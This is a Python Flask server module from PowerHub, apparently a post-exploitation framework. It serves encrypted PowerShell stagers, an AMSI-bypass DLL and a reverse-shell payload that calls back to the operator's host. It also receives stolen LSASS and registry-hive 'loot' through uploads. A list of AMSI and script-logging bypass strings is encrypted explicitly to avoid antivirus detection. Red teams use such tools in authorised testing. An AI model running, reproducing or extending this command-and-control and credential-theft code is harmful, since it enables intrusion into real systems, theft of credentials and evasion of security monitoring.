
from base64 import b64encode
from datetime import datetime
import logging
import os
import shutil
from tempfile import TemporaryDirectory

from flask import Flask, render_template, request, Response, redirect, \
         send_from_directory, flash, make_response, abort, jsonify

from werkzeug.serving import WSGIRequestHandler, _log
from werkzeug.middleware.proxy_fix import ProxyFix
from flask_socketio import SocketIO  # , emit

from powerhub.sql import get_clipboard, init_db, decrypt_hive, get_loot, \
        delete_loot
from powerhub.stager import modules, stager_str, callback_url, \
        import_modules, webdav_url
from powerhub.upload import save_file, get_filelist
from powerhub.directories import UPLOAD_DIR, BASE_DIR, DB_FILENAME, \
        XDG_DATA_HOME
from powerhub.tools import encrypt, compress, get_secret_key
from powerhub.auth import requires_auth
from powerhub.repos import repositories, install_repo
from powerhub.obfuscation import symbol_name
from powerhub.receiver import ShellReceiver
from powerhub.loot import save_loot, get_lsass_goodies, get_hive_goodies, \
        parse_sysinfo
from powerhub.args import args
from powerhub.logging import log
from powerhub._version import __version__


app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1, x_port=1)
app.config.update(
    DEBUG=args.DEBUG,
    SECRET_KEY=os.urandom(16),
    SQLALCHEMY_DATABASE_URI='sqlite:///' + DB_FILENAME,
    SQLALCHEMY_TRACK_MODIFICATIONS=False,
)

try:
    from flask_sqlalchemy import SQLAlchemy
    db = SQLAlchemy(app)
    init_db(db)
except ImportError as e:
    log.error("You have unmet dependencies, database will not be available")
    log.exception(e)
    db = None
cb = get_clipboard()
KEY = get_secret_key()

socketio = SocketIO(
    app,
    async_mode="threading",
)

if not args.DEBUG:
    logging.getLogger("socketio").setLevel(logging.WARN)
    logging.getLogger("engineio").setLevel(logging.WARN)

need_proxy = True
need_tlsv12 = (args.SSL_KEY is not None)


def push_notification(type, msg, title, subtitle="", **kwargs):
    arguments = {
        'msg': msg,
        'title': title,
        'subtitle': subtitle,
        'type': type,
    }
    arguments.update(dict(**kwargs)),
    socketio.emit('push',
                  arguments,
                  namespace="/push-notifications")


shell_receiver = ShellReceiver(push_notification=push_notification)


class MyRequestHandler(WSGIRequestHandler):
    def address_string(self):
        if 'x-forwarded-for' in dict(self.headers._headers):
            return dict(self.headers._headers)['x-forwarded-for']
        else:
            return self.client_address[0]

    def log(self, type, message, *largs):
        # don't log datetime again
        if " /socket.io/?" not in largs[0] or args.DEBUG:
            _log(type, '%s %s\n' % (self.address_string(), message % largs))


def run_flask_app():
    socketio.run(
        app,
        port=args.FLASK_PORT,
        host='127.0.0.1',
        use_reloader=False,
        request_handler=MyRequestHandler,
    )


@app.template_filter()
def debug(msg):
    if args.DEBUG:
        return msg
    return ""


@app.template_filter()
def nodebug(msg):
    if not args.DEBUG:
        return msg
    return ""


@app.route('/')
@requires_auth
def index():
    return redirect('/hub')


@app.route('/hub')
@requires_auth
def hub():
    context = {
        "dl_str": stager_str(need_proxy=need_proxy,
                             need_tlsv12=need_tlsv12),
        "modules": modules,
        "repositories": list(repositories.keys()),
        "SSL": args.SSL_KEY is not None,
        "AUTH": args.AUTH,
        "VERSION": __version__,
    }
    return render_template("hub.html", **context)


@app.route('/receiver')
@requires_auth
def receiver():
    context = {
        "dl_str": stager_str(flavor='reverse_shell',
                             need_proxy=need_proxy,
                             need_tlsv12=need_tlsv12),
        "SSL": args.SSL_KEY is not None,
        "shells": shell_receiver.active_shells(),
        "AUTH": args.AUTH,
        "VERSION": __version__,
    }
    return render_template("receiver.html", **context)


@app.route('/loot')
@requires_auth
def loot_tab():
    # turn sqlalchemy object 'lootbox' into dict/array
    lootbox = get_loot()
    loot = [{
        "nonpersistent": db is None,
        "id": l.id,
        "lsass": get_lsass_goodies(l.lsass),
        "lsass_full": l.lsass,
        "hive": get_hive_goodies(l.hive),
        "hive_full": l.hive,
        "sysinfo": parse_sysinfo(l.sysinfo,)
    } for l in lootbox]
    context = {
        "loot": loot,
        "AUTH": args.AUTH,
        "VERSION": __version__,
    }
    return render_template("loot.html", **context)


@app.route('/clipboard')
@requires_auth
def clipboard():
    context = {
        "nonpersistent": db is None,
        "clipboard": list(cb.entries.values()),
        "AUTH": args.AUTH,
        "VERSION": __version__,
    }
    return render_template("clipboard.html", **context)


@app.route('/fileexchange')
@requires_auth
def fileexchange():
    context = {
        "files": get_filelist(),
        "AUTH": args.AUTH,
        "VERSION": __version__,
    }
    return render_template("fileexchange.html", **context)


@app.route('/css/<path:path>')
def send_css(path):
    return send_from_directory('static/css', path)


@app.route('/js/<path:path>')
def send_js(path):
    return send_from_directory('static/js', path)


@app.route('/img/<path:path>')
def send_img(path):
    return send_from_directory('static/img', path)


@app.route('/clipboard/add', methods=["POST"])
@requires_auth
def add_clipboard():
    """Add a clipboard entry"""
    content = request.form.get("content")
    cb.add(
        content,
        str(datetime.utcnow()).split('.')[0],
        request.remote_addr
    )
    push_notification("reload", "Update Clipboard", "")
    return redirect('/clipboard')


@app.route('/clipboard/delete', methods=["POST"])
@requires_auth
def del_clipboard():
    """Delete a clipboard entry"""
    id = int(request.form.get("id"))
    cb.delete(id)
    return ""


@app.route('/clipboard/del-all', methods=["POST"])
@requires_auth
def del_all_clipboard():
    """Delete all clipboard entries"""
    for id in list(cb.entries.keys()):
        cb.delete(id)
    return ""


@app.route('/clipboard/export', methods=["GET"])
@requires_auth
def export_clipboard():
    """Export all clipboard entries"""
    result = ""
    for e in list(cb.entries.values()):
        headline = "%s (%s)\r\n" % (e.time, e.IP)
        result += headline
        result += "="*(len(headline)-2) + "\r\n"
        result += e.content + "\r\n"*2
    return Response(
        result,
        content_type='text/plain; charset=utf-8'
    )


@app.route('/loot/export', methods=["GET"])
@requires_auth
def export_loot():
    """Export all loot entries"""
    lootbox = get_loot()
    loot = [{
        "id": l.id,
        "lsass": get_lsass_goodies(l.lsass),
        "hive": get_hive_goodies(l.hive),
        "sysinfo": parse_sysinfo(l.sysinfo,)
    } for l in lootbox]
    return jsonify(loot)


@app.route('/loot/del-all', methods=["POST"])
@requires_auth
def del_all_loog():
    """Delete all loot entries"""
    # TODO get confirmation by user
    delete_loot()
    return redirect("/loot")


@app.route('/m')
def payload_m():
    """Load a single module"""
    if 'm' not in request.args:
        return Response('error')
    n = int(request.args.get('m'))
    if n < len(modules):
        modules[n].activate()
        if 'c' in request.args:
            resp = b64encode(encrypt(compress(modules[n].code), KEY)),
        else:
            resp = b64encode(encrypt(modules[n].code, KEY)),
        return Response(
            resp,
            content_type='text/plain; charset=utf-8'
        )
    else:
        return Response("not found")


@app.route('/0')
def payload_0():
    """Load 0th stage"""
    # these are possibly 'suspicious' strings to be used in the powershell
    # payload. we don't want AV to detect them.
    encrypted_strings = [
        "Bypass.AMSI",
        "System.Management.Automation.Utils",
        "cachedGroupPolicySettings",
        "NonPublic,Static",
        "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging",  # noqa
        "EnableScriptBlockLogging",
        "Failed to disable AMSI, aborting",
        """ using System;
            using System.Runtime.InteropServices;

            public class Kernel32 {
                [DllImport("kernel32")]
                public static extern IntPtr GetProcAddress(IntPtr hModule,
                    string lpProcName);

                [DllImport("kernel32")]
                public static extern IntPtr LoadLibrary(string lpLibFileName);

                [DllImport("kernel32")]
                public static extern bool VirtualProtect(IntPtr lpAddress,
                                UIntPtr dwSize, uint flNewProtect,
                                out uint lpflOldProtect);
            }
        """,
        "amsi.dll",
        b64encode(bytes([0x4C, 0x8B, 0xDC, 0x49, 0x89, 0x5B, 0x08, 0x49, 0x89,
                  0x6B, 0x10, 0x49, 0x89, 0x73, 0x18, 0x57, 0x41, 0x56,
                  0x41, 0x57, 0x48, 0x83, 0xEC, 0x70])).decode(),
        b64encode(bytes([0x8B, 0xFF, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x18,
                         0x53, 0x56])).decode(),
        "DllCanUnloadNow",
    ]
    encrypted_strings = [b64encode(encrypt(x.encode(), KEY)).decode() for x
                         in encrypted_strings]
    try:
        clipboard_id = int(request.args.get('e'))
        exec_clipboard_entry = cb.entries[clipboard_id].content
    except TypeError:
        exec_clipboard_entry = ""
    context = {
        "modules": modules,
        "callback_url": callback_url,
        "key": KEY,
        "strings": encrypted_strings,
        "symbol_name": symbol_name,
        "stage2": 'r' if 'r' in request.args else '1',
        "exec_clipboard_entry": exec_clipboard_entry,
    }
    result = render_template(
                    "powershell/stager.ps1",
                    **context,
                    content_type='text/plain'
    )
    return result


@app.route('/1')
def payload_1():
    """Load 1st stage"""
    try:
        with open(os.path.join(XDG_DATA_HOME, "profile.ps1"), "r") as f:
            profile = f.read()
    except Exception:
        profile = ""
    context = {
        "modules": modules,
        "webdav_url": webdav_url,
        "symbol_name": symbol_name,
        "profile": profile,
    }
    result = render_template(
                    "powershell/payload.ps1",
                    **context,
    ).encode()
    result = b64encode(encrypt(result, KEY))
    return Response(result, content_type='text/plain; charset=utf-8')


@app.route('/l')
def payload_l():
    """Load the AMSI Bypass DLL"""
    # https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html  # noqa

    if request.args['arch'] == 'x86':
        filename = os.path.join(BASE_DIR, 'binary', 'amsi.dll')
    else:
        filename = os.path.join(BASE_DIR, 'binary', 'amsi64.dll')
    with open(filename, 'rb') as f:
        DLL = f.read()
    DLL = b64encode(encrypt(DLL, KEY))
    return Response(DLL, content_type='text/plain; charset=utf-8')


@app.route('/dlcradle')
def dlcradle():
    global need_proxy, need_tlsv12
    need_proxy = request.args['proxy'] == 'true'
    need_tlsv12 = request.args['tlsv12'] == 'true'
    return stager_str(need_proxy=need_proxy, need_tlsv12=need_tlsv12)


@app.route('/u', methods=["POST"])
def upload():
    """Upload one or more files"""
    file_list = request.files.getlist("file[]")
    noredirect = "noredirect" in request.args
    loot = "loot" in request.args and request.args["loot"]
    for file in file_list:
        if file.filename == '':
            return redirect(request.url)
        if file:
            if loot:
                loot_id = request.args["loot"]
                log.info("Loot received - %s" % loot_id)
                save_loot(file, loot_id)
            else:
                log.info("File received - %s" % file.filename)
                save_file(file)
    if loot:
        decrypt_hive(loot_id)
        push_notification("reload", "Update Loot", "")
    else:
        push_notification("reload", "Update Fileexchange", "")
    if noredirect:
        return ('OK', 200)
    else:
        return redirect('/fileexchange')


@app.route('/d/<path:filename>')
@requires_auth
def download_file(filename):
    """Download a file"""
    try:
        return send_from_directory(UPLOAD_DIR,
                                   filename,
                                   as_attachment=True)
    except PermissionError:
        abort(403)


@app.route('/d-all')
@requires_auth
def download_all():
    """Download archive of all uploaded files"""
    tmp_dir = TemporaryDirectory()
    file_name = "powerhub_upload_export_" + \
                datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    shutil.make_archive(os.path.join(tmp_dir.name, file_name),
                        "zip",
                        UPLOAD_DIR)
    return send_from_directory(tmp_dir.name,
                               file_name + ".zip",
                               as_attachment=True)


@app.route('/getrepo', methods=["POST"])
@requires_auth
def get_repo():
    """Download a specified repository"""
    msg, msg_type = install_repo(
        request.form['repo'],
        request.form['custom-repo']
    )
    # possible types: success, info, danger, warning
    flash(msg, msg_type)
    return redirect('/hub')


@app.route('/reload', methods=["POST"])
@requires_auth
def reload_modules():
    """Reload all modules from disk"""
    try:
        global modules
        modules = import_modules()
        flash("Modules reloaded (press F5 to see them)", "success")
    except Exception as e:
        flash("Error while reloading modules: %s" % str(e), "danger")
    return render_template("messages.html")


@app.route('/r', methods=["GET"])
def reverse_shell():
    """Spawn a reverse shell"""
    context = {
        "dl_cradle": stager_str().replace('$K', '$R'),
        "IP": args.URI_HOST,
        "delay": 10,  # delay in seconds
        "lifetime": 3,  # lifetime in days
        "PORT": str(args.REC_PORT),
        "key": KEY,
        "symbol_name": symbol_name,
    }
    result = render_template(
                    "powershell/reverse-shell.ps1",
                    **context,
    ).encode()
    result = b64encode(encrypt(result, KEY))
    return Response(result, content_type='text/plain; charset=utf-8')


@app.route('/shell-log', methods=["GET"])
def shell_log():
    shell_id = request.args['id']
    if 'content' in request.args:
        content = request.args['content']
    else:
        content = 'html'
    shell = shell_receiver.get_shell_by_id(shell_id)
    log = shell.get_log()
    context = {
        'log': log,
        'content': content,
    }
    if content == 'html':
        return render_template("receiver/shell-log.html", **context)
    elif content == 'raw':
        response = make_response(render_template("receiver/shell-log.html",
                                 **context))
        response.headers['Content-Disposition'] = \
            'attachment; filename=' + shell_id + ".log"
        response.headers['content-type'] = 'text/plain; charset=utf-8'
        return response


@app.route('/kill-shell', methods=["POST"])
def shell_kill():
    shell_id = request.form.get("shellid")
    shell = shell_receiver.get_shell_by_id(shell_id)
    shell.kill()
    return ""


@app.route('/forget-shell', methods=["POST"])
def shell_forget():
    shell_id = request.form.get("shellid")
    shell_receiver.forget_shell(shell_id)
    return ""


@app.route('/kill-all', methods=["POST"])
def shell_kill_all():
    for shell in shell_receiver.active_shells():
        shell.kill()
    return ""


@app.route('/receiver/shellcard', methods=["GET"])
def shell_card():
    shell_id = request.args["shell-id"]
    shell = shell_receiver.get_shell_by_id(shell_id)
    return render_template("receiver/receiver-shellcard.html", s=shell)


@socketio.on('connect', namespace="/push-notifications")
def test_connect():
    log.debug("Websockt client connected")
